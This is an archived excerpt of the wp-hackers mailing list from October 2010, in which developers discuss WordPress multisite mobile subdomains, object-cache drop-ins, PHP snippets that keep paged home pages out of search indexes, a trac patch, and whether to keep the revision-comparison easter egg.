	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
	<AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
	<A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>
	<AANLkTin8KEAcmoMrid2-Q1-zTC9Tg0N=b7jPqzXOog3n@mail.gmail.com>
	<AANLkTimA87fRbdo-owYH_58MXPZondgVOKm6EipzqK6W@mail.gmail.com>
	<AANLkTi=ULoi8U9SmoPDe1es9P8EqyNdKeODjQ-GAVYLX@mail.gmail.com>
	<AANLkTinKZa7v5Fm3cmyU7GzmzLwf8LD73DMdE5oBzcDf@mail.gmail.com>
	<AANLkTimgA1_eQCYZYBfvwRwMCTe3DxcHsSB9HFRcN6Yz@mail.gmail.com>
	<AANLkTim23+PdPKXViH3kL0u=zZY0Rwx4FnbU-yE=N2+R@mail.gmail.com>
	<AANLkTimrOkZHgsshfzJ3vrUMcq3O5dYg=+BfwHN40RFX@mail.gmail.com>
Message-ID: <1650764325188132636@unknownmsgid>

Could you write up your process as a tutorial or similar? :)

Sent from my iPhone

On 22 Oct 2010, at 20:18, Ryan Bilesky <rbilesky at gmail.com> wrote:

> Well all is good now, It only took killing a kitten by hacking core, but
> that's ok because it was a bug one which has a trac ticket and I am doing to
> create a diff file to attach to the ticket and hopefully my change will make
> it in the next version.  Pages now work that verbose page rules aren't being
> used.  Besides I think it really is going to be better having it as a
> separate site for SEO, I can tell regular bots like googlebot not to index
> the mobile site and tell mobile bots like googlebot-mobile not the index my
> main site so I am not getting both sites indexed by the the same bot and
> being penalized for duplicate content.
>
> On Fri, Oct 22, 2010 at 8:54 AM, Jeremy Clarke <jer at simianuprising.com>wrote:
>
>> The *WordPress Mobile Edition* plugin lets you activate the mobile version
>> of the site with a URL parameter like /?cf_mobi=1 or something. Maybe you
>> could set up something in .htaccess to forward m.mysite.com to
>> mysite.com/?cf_mobi=1. At least with that particular plugin the result
>> would
>> be that the user continues to see the mobile version as they click around,
>> so the fact that the "m." is gone from the url wouldn't be the end of the
>> world.
>>
>> I mean, you should be mostly depending on user agent sniffing to decide
>> when
>> to show the mobile version anyway, so the short url could be just a
>> shortcut
>> rather than a whole other address.
>>
>> --
>> Jeremy Clarke | http://jeremyclarke.org
>> Code and Design | http://globalvoicesonline.org
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mail at scribu.net  Fri Oct 22 18:27:55 2010
From: mail at scribu.net (scribu)
Date: Fri, 22 Oct 2010 21:27:55 +0300
Subject: [wp-hackers] Permalink Performance
In-Reply-To: <AANLkTi=nUMrJMqri2Y1eQhupi4=mL0jvewFzM05XJMS7@mail.gmail.com>
References: <AANLkTi=8mGe=27ftFpb-d9pC+as9zvvAh6sJ0OQ0AxPB@mail.gmail.com>
	<AANLkTimhTX=W+=MkrpVzcRL8ojNVXL1emGyHpJTYf=zj@mail.gmail.com>
	<AANLkTik2Z_HKBQJhkoRDPC_-qFAufGZ-pxyJRxe_rdfS@mail.gmail.com>
	<AANLkTinShUshti6kXpsU=97gBZg9N35BZLTByy1oDxU-@mail.gmail.com>
	<AANLkTin4ibHZN42+2ENqTHj3XSAKXW0=UOryht-PMa3J@mail.gmail.com>
	<AANLkTimv0hVOzkjTBZa4_x+=xS=iWtS27yOd0maHsE4-@mail.gmail.com>
	<AANLkTi=nUMrJMqri2Y1eQhupi4=mL0jvewFzM05XJMS7@mail.gmail.com>
Message-ID: <AANLkTimXc3cmSoiQUWMfn8VtwZ1KTS6k8qX5VGSc4YdD@mail.gmail.com>

On Fri, Oct 22, 2010 at 8:46 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> Great.  Seems to work as expected now on my install of wordpress so I am
> going to generate a diff and attach it to the ticket.
>

Make sure to also leave a comment, since attachments don't generate
notifications.

From mail at scribu.net  Fri Oct 22 18:30:55 2010
From: mail at scribu.net (scribu)
Date: Fri, 22 Oct 2010 21:30:55 +0300
Subject: [wp-hackers] get_post_meta() returning a cached WP_Error?
In-Reply-To: <2FAE6681-B02A-4558-A2CF-3131FAC63745@newclarity.net>
References: <2FAE6681-B02A-4558-A2CF-3131FAC63745@newclarity.net>
Message-ID: <AANLkTik8QR2OTQktHiARmj3CYmtxz+8r_56SizT5nqAp@mail.gmail.com>

On Fri, Oct 22, 2010 at 9:26 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> Should get_post_meta() be returning a cached WP_Error like this?  I'm
> passing single=true so shouldn't I just be getting an empty string?  Is this
> a bug for trac, or expected behavior?
>

It's definetly a bug somewhere. You should open a ticket if you find out
it's caused by WP.

From mail at scribu.net  Fri Oct 22 18:32:19 2010
From: mail at scribu.net (scribu)
Date: Fri, 22 Oct 2010 21:32:19 +0300
Subject: [wp-hackers] get_post_meta() returning a cached WP_Error?
In-Reply-To: <AANLkTik8QR2OTQktHiARmj3CYmtxz+8r_56SizT5nqAp@mail.gmail.com>
References: <2FAE6681-B02A-4558-A2CF-3131FAC63745@newclarity.net>
	<AANLkTik8QR2OTQktHiARmj3CYmtxz+8r_56SizT5nqAp@mail.gmail.com>
Message-ID: <AANLkTin-twNM8v7n4AGkLWKNmztT-dY2YFT16=ViBjM+@mail.gmail.com>

On Fri, Oct 22, 2010 at 9:30 PM, scribu <mail at scribu.net> wrote:

> On Fri, Oct 22, 2010 at 9:26 PM, Mike Schinkel <
> mikeschinkel at newclarity.net> wrote:
>
>> Should get_post_meta() be returning a cached WP_Error like this?  I'm
>> passing single=true so shouldn't I just be getting an empty string?  Is this
>> a bug for trac, or expected behavior?
>>
>
By the way, single=true just means that it returns the first value it finds,
after running maybe_unserialize() on it.

From mikeschinkel at newclarity.net  Fri Oct 22 18:36:44 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 22 Oct 2010 14:36:44 -0400
Subject: [wp-hackers] get_post_meta() returning a cached WP_Error?
In-Reply-To: <AANLkTik8QR2OTQktHiARmj3CYmtxz+8r_56SizT5nqAp@mail.gmail.com>
References: <2FAE6681-B02A-4558-A2CF-3131FAC63745@newclarity.net>
	<AANLkTik8QR2OTQktHiARmj3CYmtxz+8r_56SizT5nqAp@mail.gmail.com>
Message-ID: <93DAA1B8-7EC8-401C-910E-533A569D04A2@newclarity.net>

Thanks for the quick response.

However, it is my bad.  The serialized WP_Error actually got stored as a post_meta value, so the error is upstream somewhere and probably not a bug in WordPress.

Sorry for the false alarm.

-Mike


On Oct 22, 2010, at 2:30 PM, scribu wrote:

> On Fri, Oct 22, 2010 at 9:26 PM, Mike Schinkel
> <mikeschinkel at newclarity.net>wrote:
> 
>> Should get_post_meta() be returning a cached WP_Error like this?  I'm
>> passing single=true so shouldn't I just be getting an empty string?  Is this
>> a bug for trac, or expected behavior?
>> 
> 
> It's definetly a bug somewhere. You should open a ticket if you find out
> it's caused by WP.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From rbilesky at gmail.com  Fri Oct 22 18:40:32 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Fri, 22 Oct 2010 11:40:32 -0700
Subject: [wp-hackers] Permalink Performance
In-Reply-To: <AANLkTimXc3cmSoiQUWMfn8VtwZ1KTS6k8qX5VGSc4YdD@mail.gmail.com>
References: <AANLkTi=8mGe=27ftFpb-d9pC+as9zvvAh6sJ0OQ0AxPB@mail.gmail.com>
	<AANLkTimhTX=W+=MkrpVzcRL8ojNVXL1emGyHpJTYf=zj@mail.gmail.com>
	<AANLkTik2Z_HKBQJhkoRDPC_-qFAufGZ-pxyJRxe_rdfS@mail.gmail.com>
	<AANLkTinShUshti6kXpsU=97gBZg9N35BZLTByy1oDxU-@mail.gmail.com>
	<AANLkTin4ibHZN42+2ENqTHj3XSAKXW0=UOryht-PMa3J@mail.gmail.com>
	<AANLkTimv0hVOzkjTBZa4_x+=xS=iWtS27yOd0maHsE4-@mail.gmail.com>
	<AANLkTi=nUMrJMqri2Y1eQhupi4=mL0jvewFzM05XJMS7@mail.gmail.com>
	<AANLkTimXc3cmSoiQUWMfn8VtwZ1KTS6k8qX5VGSc4YdD@mail.gmail.com>
Message-ID: <AANLkTinYMYWHtbNb=GgJWb5egAwzBCyN-vw=5HJ=_vsD@mail.gmail.com>

Well right now I am having problems checking out the the wordpress source
from subversion.  I am using tortoise but when I try to checkout i get this
error: OPTIONS of 'http://core.svn.wordpress.org/trunk': 200 OK (
http://core.svn.wordpress.org) which as far as i can tell is a generic error
that could mean almost anything.  I can however access
http://core.svn.wordpress.org/trunk in my browser no problems so its not any
sort of server issue or dns issue or anything.

On Fri, Oct 22, 2010 at 11:27 AM, scribu <mail at scribu.net> wrote:

> On Fri, Oct 22, 2010 at 8:46 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > Great.  Seems to work as expected now on my install of wordpress so I am
> > going to generate a diff and attach it to the ticket.
> >
>
> Make sure to also leave a comment, since attachments don't generate
> notifications.
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From dougal at gunters.org  Fri Oct 22 20:22:08 2010
From: dougal at gunters.org (Dougal Campbell)
Date: Fri, 22 Oct 2010 16:22:08 -0400
Subject: [wp-hackers] Handling non_persistent_groups in a persistent
 object cache
In-Reply-To: <AANLkTik-=D3cqRsCCfJsXpyxP5ShA1dKS27C4pDXB2Fi@mail.gmail.com>
References: <AANLkTi=eQAaDRf_wxsryRdhzVtG1ajFBPWubNZS2C2WM@mail.gmail.com>	<AANLkTi=gsqYx_ha4rdfT7fXnPj2kWaFAB=b-L4U51m7r@mail.gmail.com>
	<AANLkTik-=D3cqRsCCfJsXpyxP5ShA1dKS27C4pDXB2Fi@mail.gmail.com>
Message-ID: <4CC1F270.8050301@gunters.org>

On Oct 21 2010 7:34 AM, John Blackbourn wrote:
> On Thu, Oct 21, 2010 at 11:35 AM, scribu<mail at scribu.net>  wrote:
>> I think your best bet is to look at the implementation for memcache:
>>
>> http://wordpress.org/extend/plugins/memcached/
> Looking at that memcache implementation, that should indeed be the
> behaviour for the non persistent groups. Thanks for the link.
>

Did you start with prior art for XCache?

   
http://dougal.gunters.org/blog/2008/08/29/xcache-object-cache-plugin-for-wordpress-25

I don't use XCache anymore (in my new setup I have APC and memcached, 
instead), so I haven't checked to see if my code needs updating.

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From cclarkson at htcomp.net  Fri Oct 22 20:22:28 2010
From: cclarkson at htcomp.net (Charles K. Clarkson)
Date: Fri, 22 Oct 2010 15:22:28 -0500
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
In-Reply-To: <AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
References: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>
	<AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
Message-ID: <4CC1F284.2080506@htcomp.net>

On 10/22/2010 1:30 AM, Alex Hempton-Smith wrote:

> function my_plugin_head() {
>      if ( !is_home() )
>          echo '<meta name="robots" content="noindex, nofollow">';
> }
> add_action('wp_head', 'my_plugin_head');

is_home() should test true on the pages Rich wants to exclude.

add_action('wp_head', 'my_plugin_head');
function my_plugin_head() {

     $current_page = get_query_var('paged') ? get_query_var('paged') : 1;

     if ( is_home() && 1 < $current_page )
         echo '<meta name="robots" content="noindex, nofollow">';
}



HTH,

Charles Clarkson
-- 
Mobile Home Investor
Free Market Advocate
Programmer

I'm not really a smart person. I just play one on the Internet.

Stephenville, TX
http://twitter.com/CharlesClarkson
+1 (254) 968-8328

From dougal at gunters.org  Fri Oct 22 20:26:00 2010
From: dougal at gunters.org (Dougal Campbell)
Date: Fri, 22 Oct 2010 16:26:00 -0400
Subject: [wp-hackers] Drop-ins in WP Plugin Directory?
Message-ID: <4CC1F358.3040505@gunters.org>

Has there been any discussion/thought about support for drop-ins for the 
Plugin Directory? For stuff like object-cache plugins, db.php, etc? I 
know it's a limited use-case, but the reason I never put my XCache 
object-cache plugin in the repo was because it just seemed out of place, 
since it's not a "normal" plugin.

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/


From wp at andrewnacin.com  Fri Oct 22 20:29:24 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 22 Oct 2010 16:29:24 -0400
Subject: [wp-hackers] Drop-ins in WP Plugin Directory?
In-Reply-To: <4CC1F358.3040505@gunters.org>
References: <4CC1F358.3040505@gunters.org>
Message-ID: <AANLkTi=eAhauWPR8pojE1MKvQzgWzFsrDniJh32ABMRt@mail.gmail.com>

On Fri, Oct 22, 2010 at 4:26 PM, Dougal Campbell <dougal at gunters.org> wrote:

> Has there been any discussion/thought about support for drop-ins for the
> Plugin Directory? For stuff like object-cache plugins, db.php, etc? I know
> it's a limited use-case, but the reason I never put my XCache object-cache
> plugin in the repo was because it just seemed out of place, since it's not a
> "normal" plugin.


There are a few object caches in the repo, Memcached for one. The readme
states to move the object-cache.php file to the proper place.

I think some of the database caching drop-ins (not that I would implement
one of these so willy nilly) will actually copy the file over for you on
activation.

From wp at andrewnacin.com  Fri Oct 22 20:31:07 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 22 Oct 2010 16:31:07 -0400
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
In-Reply-To: <4CC1F284.2080506@htcomp.net>
References: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>
	<AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
	<4CC1F284.2080506@htcomp.net>
Message-ID: <AANLkTimAQpPf_sDW4_05D6AGXzO99NdetUu=Q47TtSv1@mail.gmail.com>

On Fri, Oct 22, 2010 at 4:22 PM, Charles K. Clarkson
<cclarkson at htcomp.net>wrote:

>    $current_page = get_query_var('paged') ? get_query_var('paged') : 1;


Per http://codex.wordpress.org/Conditional_Tags:
if ( is_home() && is_paged() )

From dougal at gunters.org  Fri Oct 22 20:45:18 2010
From: dougal at gunters.org (Dougal Campbell)
Date: Fri, 22 Oct 2010 16:45:18 -0400
Subject: [wp-hackers] Drop-ins in WP Plugin Directory?
In-Reply-To: <AANLkTi=eAhauWPR8pojE1MKvQzgWzFsrDniJh32ABMRt@mail.gmail.com>
References: <4CC1F358.3040505@gunters.org>
	<AANLkTi=eAhauWPR8pojE1MKvQzgWzFsrDniJh32ABMRt@mail.gmail.com>
Message-ID: <4CC1F7DE.1070305@gunters.org>

On Oct 22 2010 4:29 PM, Andrew Nacin wrote:
> On Fri, Oct 22, 2010 at 4:26 PM, Dougal Campbell<dougal at gunters.org>  wrote:
>
>> Has there been any discussion/thought about support for drop-ins for the
>> Plugin Directory? For stuff like object-cache plugins, db.php, etc? I know
>> it's a limited use-case, but the reason I never put my XCache object-cache
>> plugin in the repo was because it just seemed out of place, since it's not a
>> "normal" plugin.
>
> There are a few object caches in the repo, Memcached for one. The readme
> states to move the object-cache.php file to the proper place.
>
> I think some of the database caching drop-ins (not that I would implement
> one of these so willy nilly) will actually copy the file over for you on
> activation.

Right, I realize that there *are* drop-ins in the repo, it's just that 
they aren't given any special treatment. The only way an end-user is 
going to know that they need special handling is to read the documentation.

Now, I'm not saying that the user *shouldn't* read the documentation, 
*especially* when it comes to drop-ins. But what I might like to see 
would be: 1) A flag in the plugin header or readme.txt to indicate to 
the repo that this is a drop-in. 2) A visual indication on the Directory 
indicating that drop-ins are "special". 3) Maybe, eventually, the same 
one-click install/upgrade support the other plugins have (that one might 
require more thought, and might even be a bad idea, I'll concede).

The main point of this is that if a curious, but non-tech-savvy user 
uses the built-in install for a drop-in without reading the notes, 
they'll basically see nothing happen. In many cases, they'll probably 
assume that the plugin is broken in some way. Yes, an ambitious plugin 
developer could try to handle this in their code by creating an 
activation shim to (attempt to) copy the code to the right place. But 
who wants to do that?

It just seems to me that if we're going to host drop-ins in the 
Directory, it might be nice to have a way to indicate that they are not 
"normal" plugins, and that the user needs to give them extra attention.


-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From rbilesky at gmail.com  Fri Oct 22 21:00:08 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Fri, 22 Oct 2010 14:00:08 -0700
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <1650764325188132636@unknownmsgid>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
	<AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
	<A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>
	<AANLkTin8KEAcmoMrid2-Q1-zTC9Tg0N=b7jPqzXOog3n@mail.gmail.com>
	<AANLkTimA87fRbdo-owYH_58MXPZondgVOKm6EipzqK6W@mail.gmail.com>
	<AANLkTi=ULoi8U9SmoPDe1es9P8EqyNdKeODjQ-GAVYLX@mail.gmail.com>
	<AANLkTinKZa7v5Fm3cmyU7GzmzLwf8LD73DMdE5oBzcDf@mail.gmail.com>
	<AANLkTimgA1_eQCYZYBfvwRwMCTe3DxcHsSB9HFRcN6Yz@mail.gmail.com>
	<AANLkTim23+PdPKXViH3kL0u=zZY0Rwx4FnbU-yE=N2+R@mail.gmail.com>
	<AANLkTimrOkZHgsshfzJ3vrUMcq3O5dYg=+BfwHN40RFX@mail.gmail.com>
	<1650764325188132636@unknownmsgid>
Message-ID: <AANLkTinXUuYTPi011BhrEomcsrtLCVp-p0GkOhAza_zf@mail.gmail.com>

I can do that, in fact I just decided to start a blog to cover this any many
other hacks I have made and am making to my blog for other to see and
hopefully learn from my mistakes.

http://hackingwp.com/

On Fri, Oct 22, 2010 at 11:26 AM, Alexander Hempton-Smith <
hempsworth at gmail.com> wrote:

> Could you write up your process as a tutorial or similar? :)
>
> Sent from my iPhone
>
> On 22 Oct 2010, at 20:18, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > Well all is good now, It only took killing a kitten by hacking core, but
> > that's ok because it was a bug one which has a trac ticket and I am doing
> to
> > create a diff file to attach to the ticket and hopefully my change will
> make
> > it in the next version.  Pages now work that verbose page rules aren't
> being
> > used.  Besides I think it really is going to be better having it as a
> > separate site for SEO, I can tell regular bots like googlebot not to
> index
> > the mobile site and tell mobile bots like googlebot-mobile not the index
> my
> > main site so I am not getting both sites indexed by the the same bot and
> > being penalized for duplicate content.
> >
> > On Fri, Oct 22, 2010 at 8:54 AM, Jeremy Clarke <jer at simianuprising.com
> >wrote:
> >
> >> The *WordPress Mobile Edition* plugin lets you activate the mobile
> version
> >> of the site with a URL parameter like /?cf_mobi=1 or something. Maybe
> you
> >> could set up something in .htaccess to forward m.mysite.com to
> >> mysite.com/?cf_mobi=1. At least with that particular plugin the result
> >> would
> >> be that the user continues to see the mobile version as they click
> around,
> >> so the fact that the "m." is gone from the url wouldn't be the end of
> the
> >> world.
> >>
> >> I mean, you should be mostly depending on user agent sniffing to decide
> >> when
> >> to show the mobile version anyway, so the short url could be just a
> >> shortcut
> >> rather than a whole other address.
> >>
> >> --
> >> Jeremy Clarke | http://jeremyclarke.org
> >> Code and Design | http://globalvoicesonline.org
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From hempsworth at gmail.com  Fri Oct 22 23:47:19 2010
From: hempsworth at gmail.com (Alexander Hempton-Smith)
Date: Sat, 23 Oct 2010 00:47:19 +0100
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
In-Reply-To: <AANLkTimAQpPf_sDW4_05D6AGXzO99NdetUu=Q47TtSv1@mail.gmail.com>
References: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>
	<AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
	<4CC1F284.2080506@htcomp.net>
	<AANLkTimAQpPf_sDW4_05D6AGXzO99NdetUu=Q47TtSv1@mail.gmail.com>
Message-ID: <16115299333354368@unknownmsgid>

Exactly what I would have sent if I wasn't in the air at the time!

Sent from my iPhone

On 22 Oct 2010, at 21:31, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Fri, Oct 22, 2010 at 4:22 PM, Charles K. Clarkson
> <cclarkson at htcomp.net>wrote:
>
>>   $current_page = get_query_var('paged') ? get_query_var('paged') : 1;
>
>
> Per http://codex.wordpress.org/Conditional_Tags:
> if ( is_home() && is_paged() )
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From rbilesky at gmail.com  Sat Oct 23 03:39:48 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Fri, 22 Oct 2010 20:39:48 -0700
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTikR-McTzfsQVuMTRstT70wtayniAqAovC-9qzTc@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
	<AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
	<AANLkTimVTQqq2sRXoY967g8RJAQPtfO7qOVQakMeqhAz@mail.gmail.com>
	<AANLkTikHg5X_zr5ppVwa=JzXM8hRE7+6dF5UsCPCkkmj@mail.gmail.com>
	<AANLkTinDE2tn83edT8yBrqj3OVoU9vDpuEC0p8t8v0w1@mail.gmail.com>
	<AANLkTinaYq8==Q1H+p14MD4NGigUpNQ4kT6_76tq7-pF@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E3794@tbs-sbs01.TBS.local>
	<AANLkTi=StNcfhAus-PdQmozkHrC3Y79ZJWFWPnar1Gwx@mail.gmail.com>
	<AANLkTikR-McTzfsQVuMTRstT70wtayniAqAovC-9qzTc@mail.gmail.com>
Message-ID: <AANLkTimZfj+FrJG=jsNxNKi+oEBoH6n2EMUPx5egfkSN@mail.gmail.com>

Actually if you ask me comparing a revision to itself should never be
allowed to happen in the first place, unless you want to make a easter egg.
I can see both sides and I don't think it needs to be removed.  I can
defiantly understand some non-technical types being confused by this
particular easter egg or even perhaps thinking their site is being hacked.
But the way I see it, and I said this in that ticket someone linked to as
well.

If you don't like the easter egg use javascript to prevent both radio
buttons for any given revision from being selected at the same time.
Problem solved.

On Fri, Oct 22, 2010 at 9:10 AM, Alex Andrews <awgandrews at gmail.com> wrote:

> Get rid of it. Easter eggs are clever things which require user effort
> to find and shouldn't interrupt normal functionality. Comparing a
> revision with itself is time for an error message, not an Easter Egg
> as comparison is a usual user operation. By all means, throw in an
> easter egg when the user types certain key strokes, go nuts - but this
> isn't the place.
>
> Alex
>
> On 22 October 2010 16:43, Arlen Beiler <arlenbee at gmail.com> wrote:
> > In my opinion, something like this should not be in the admin panel. Like
> > you said, it would create too much confusion and needless fumbling.
> > WordPress is supposed to be simple, not complicated.
> >
> > On Fri, Oct 22, 2010 at 11:40 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com
> >wrote:
> >
> >> Or, another option in the Admin Console (though you risk the chance of
> >> the end-user, switching them on, and wondering why it doesn't do
> >> anything) ...
> >>
> >> G
> >>
> >> -----Original Message-----
> >> From: wp-hackers-bounces at lists.automattic.com
> >> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Arlen
> >> Beiler
> >> Sent: 22 October 2010 16:37
> >> To: wp-hackers at lists.automattic.com
> >> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> >>
> >> And that could be put in a plugin or wp-config.php according to
> >> webmaster
> >> preference.
> >>
> >> On Fri, Oct 22, 2010 at 11:36 AM, Arlen Beiler <arlenbee at gmail.com>
> >> wrote:
> >>
> >> > Another way to do it, perhaps a better way, would be to have an easter
> >> egg
> >> > array that could be set on init.
> >> >
> >> > $eastereggs = array(
> >> > 'revself' => true,
> >> > 'wordpress' => true
> >> > )
> >> >
> >> > add_action('init','seteastereggs',0);
> >> > Function seteastereggs(){
> >> > $eastereggs['revself'] = false;
> >> > }
> >> >
> >> > On Fri, Oct 22, 2010 at 11:28 AM, Eric Mann <eric at eam.me> wrote:
> >> >
> >> >> I'd like to see a more fleshed-out example of how that would work,
> >> but it
> >> >> makes logical sense so far :-)
> >> >>
> >> >> On Fri, Oct 22, 2010 at 8:23 AM, Arlen Beiler <arlenbee at gmail.com>
> >> wrote:
> >> >>
> >> >> >   - off
> >> >> >   - on
> >> >> >   - custom
> >> >> >   - file
> >> >> >
> >> >> > How is that? For custom, we would then use an array, or whatever it
> >> is
> >> >> that
> >> >> > would be in eastereggs.php, since some people probably want
> >> everything
> >> >> in
> >> >> > one file. For file, it would read eastereggs.php.
> >> >> >
> >> >> > On Fri, Oct 22, 2010 at 10:56 AM, Eric Mann <eric at eam.me> wrote:
> >> >> >
> >> >> > > +1 For a setting in wp-config.
> >> >> > >
> >> >> > > define( 'EASTEREGGS', 'off' );
> >> >> > >
> >> >> > > Then maybe an "eastereggs.php" file we can drop in that defined
> >> which
> >> >> > ones
> >> >> > > we turn off.  That way it's not a wholesale all-off or all-on,
> >> but
> >> >> sites
> >> >> > > could pick and choose which ones they want to enable (for
> >> example, on
> >> >> > some
> >> >> > > sites I'd definitely want the capital P feature but not the post
> >> >> revision
> >> >> > > comparison message ... on others I might want to remove both ...
> >> on
> >> >> > others
> >> >> > > I
> >> >> > > might want to keep both and remove something else).
> >> >> > >
> >> >> > > On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler
> >> <arlenbee at gmail.com>
> >> >> > wrote:
> >> >> > >
> >> >> > > > How many easter eggs are there. And I would recommend a setting
> >> in
> >> >> > > > wp-config.php, rather than a plugin.
> >> >> > > >
> >> >> > > > On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <
> >> >> austin at ilfilosofo.com
> >> >> > > > >wrote:
> >> >> > > >
> >> >> > > > > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me>
> >> wrote:
> >> >> > > > > > As entertaining as the feature might be ... is there any
> >> way I
> >> >> can
> >> >> > > turn
> >> >> > > > > it
> >> >> > > > > > off on a client site?
> >> >> > > > >
> >> >> > > > > I proposed a patch here to allow it to be turned off by
> >> filter,
> >> >> but
> >> >> > > > > the ticket never went anywhere:
> >> >> > > > >
> >> >> > > > > <
> >> >> > > > >
> >> >> > > >
> >> >> > >
> >> >> >
> >> >>
> >>
> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisi
> >> ons-filter.12816.2.diff
> >> >> > > > > >
> >> >> > > > > _______________________________________________
> >> >> > > > > wp-hackers mailing list
> >> >> > > > > wp-hackers at lists.automattic.com
> >> >> > > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >> > > > >
> >> >> > > > _______________________________________________
> >> >> > > > wp-hackers mailing list
> >> >> > > > wp-hackers at lists.automattic.com
> >> >> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >> > > >
> >> >> > > _______________________________________________
> >> >> > > wp-hackers mailing list
> >> >> > > wp-hackers at lists.automattic.com
> >> >> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >> > >
> >> >> > _______________________________________________
> >> >> > wp-hackers mailing list
> >> >> > wp-hackers at lists.automattic.com
> >> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >> >
> >> >> _______________________________________________
> >> >> wp-hackers mailing list
> >> >> wp-hackers at lists.automattic.com
> >> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >>
> >> >
> >> >
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

